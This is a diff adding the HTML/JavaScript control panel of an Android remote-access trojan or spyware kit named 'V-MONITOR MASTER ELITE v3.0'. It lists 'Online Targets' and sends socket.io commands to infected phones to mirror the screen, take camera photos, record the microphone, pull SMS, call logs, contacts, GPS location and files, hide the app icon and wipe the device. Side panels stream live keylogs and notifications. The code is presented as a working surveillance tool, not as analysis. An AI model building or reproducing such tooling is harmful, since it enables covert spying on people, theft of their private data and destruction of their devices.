@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>V-MONITOR MASTER ELITE v3.0</title>
+    <script src="/socket.io/socket.io.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        :root { --neon: #00f2ff; --danger: #ff003c; --bg: #020508; }
+        body { background: var(--bg); color: #fff; font-family: 'Orbitron', sans-serif; margin: 0; overflow: hidden; }
+        .wrapper { display: grid; grid-template-columns: 300px 1fr 350px; height: 100vh; padding: 10px; gap: 10px; box-sizing: border-box; }
+        
+        /* Panels */
+        .panel { border: 1px solid var(--neon); background: rgba(0, 242, 255, 0.05); display: flex; flex-direction: column; overflow: hidden; border-radius: 5px; }
+        .panel-h { background: var(--neon); color: #000; padding: 8px; font-weight: bold; font-size: 13px; text-transform: uppercase; }
+        
+        /* Device List */
+        #target-list { overflow-y: auto; flex: 1; }
+        .target-item { padding: 12px; border-bottom: 1px solid rgba(0,242,255,0.2); cursor: pointer; transition: 0.3s; }
+        .target-item:hover { background: rgba(0,242,255,0.1); }
+        .target-item.active { background: var(--neon); color: #000; }
+
+        /* Controls */
+        .btn-group { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 5px; padding: 10px; }
+        .btn { background: transparent; border: 1px solid var(--neon); color: var(--neon); padding: 8px; font-size: 10px; cursor: pointer; font-family: 'Orbitron'; }
+        .btn:hover { background: var(--neon); color: #000; }
+        .btn-danger { border-color: var(--danger); color: var(--danger); }
+        .btn-danger:hover { background: var(--danger); color: #fff; }
+
+        /* Monitor */
+        .monitor { flex: 1; background: #000; display: flex; align-items: center; justify-content: center; position: relative; border: 1px solid #111; margin: 10px; }
+        #stream-img { max-width: 100%; max-height: 100%; object-fit: contain; }
+
+        /* Data Windows */
+        .data-win { flex: 1; overflow-y: auto; padding: 10px; font-size: 11px; background: rgba(0,0,0,0.5); border-bottom: 1px solid rgba(0,242,255,0.1); }
+        .log-line { margin-bottom: 5px; border-bottom: 1px solid #111; padding-bottom: 3px; }
+        .tag { color: var(--neon); font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="wrapper">
+    <div class="panel">
+        <div class="panel-h">Online Targets</div>
+        <div id="target-list"></div>
+    </div>
+
+    <div class="panel">
+        <div class="panel-h" id="active-title">Console Monitor</div>
+        <div class="monitor">
+            <img id="stream-img" src="" alt="Live Feed Waiting...">
+        </div>
+        <div class="btn-group" id="ctrl-box" style="pointer-events:none; opacity:0.4;">
+            <button class="btn" onclick="cmd('START_MIRROR')">Mirror Screen</button>
+            <button class="btn" onclick="cmd('TAKE_PHOTO',{c:'front'})">Front Cam</button>
+            <button class="btn" onclick="cmd('TAKE_PHOTO',{c:'back'})">Back Cam</button>
+            <button class="btn" onclick="cmd('REC_AUDIO',{t:30})">Mic (30s)</button>
+            <button class="btn" onclick="cmd('GET_SMS')">Fetch SMS</button>
+            <button class="btn" onclick="cmd('GET_CALLS')">Call Logs</button>
+            <button class="btn" onclick="cmd('GET_CONTACTS')">Contacts</button>
+            <button class="btn" onclick="cmd('GET_LOC')">GPS Location</button>
+            <button class="btn" onclick="cmd('GET_APPS')">Apps List</button>
+            <button class="btn" onclick="cmd('FILE_EXPLORE',{p:'/'})">Files</button>
+            <button class="btn" onclick="cmd('TORCH_ON')">Torch On</button>
+            <button class="btn" onclick="cmd('HIDE_ICON')">Hide Icon</button>
+            <button class="btn btn-danger" onclick="cmd('WIPE')">Wipe Phone</button>
+        </div>
+    </div>
+
+    <div class="panel">
+        <div class="panel-h">Live Keylogs</div>
+        <div class="data-win" id="win-key"></div>
+        <div class="panel-h">Notifications</div>
+        <div class="data-win" id="win-notif"></div>
+        <div class="panel-h">System Logs</div>
+        <div class="data-win" id="win-sys"></div>
+    </div>
+</div>
+
+<script>
+    const socket = io();
+    let selectedId = null;
+
+    socket.on('update_list', (dev) => {
+        const list = document.getElementById('target-list');
+        let el = document.getElementById('dev-' + dev.deviceId);
+        if(!el) {
+            el = document.createElement('div');
+            el.id = 'dev-' + dev.deviceId;
+            el.className = 'target-item';
+            el.onclick = () => {
+                selectedId = dev.deviceId;
+                document.getElementById('ctrl-box').style.opacity = "1";
+                document.getElementById('ctrl-box').style.pointerEvents = "auto";
+                document.getElementById('active-title').innerText = "Target: " + dev.deviceId;
+                document.querySelectorAll('.target-item').forEach(i => i.classList.remove('active'));
+                el.classList.add('active');
+            };
+            list.appendChild(el);
+        }
+        el.innerHTML = `<strong>${dev.deviceId}</strong><br><small>${dev.info.model} | Bat: ${dev.info.battery}%</small>`;
+    });
+
+    function cmd(action, payload = {}) {
+        if(!selectedId) return;
+        socket.emit('send_cmd', { id: selectedId, cmd: action, payload });
+        addLog('win-sys', 'SENT', action);
+    }
+
+    socket.on('new_incoming_data', (res) => {
+        if(res.type === 'KEYLOG') addLog('win-key', 'KEY', res.data);
+        else if(res.type === 'NOTIF') addLog('win-notif', res.data.app, res.data.msg);
+        else if(res.type === 'MIRROR') document.getElementById('stream-img').src = 'data:image/jpeg;base64,' + res.data;
+        else addLog('win-sys', res.type, 'Data received');
+    });
+
+    function addLog(winId, tag, msg) {
+        const win = document.getElementById(winId);
+        const line = document.createElement('div');
+        line.className = 'log-line';
+        line.innerHTML = `<span class="tag">[${tag}]</span> ${msg}`;
+        win.prepend(line);
+    }
+</script>
+</body>
+      </html>
+        
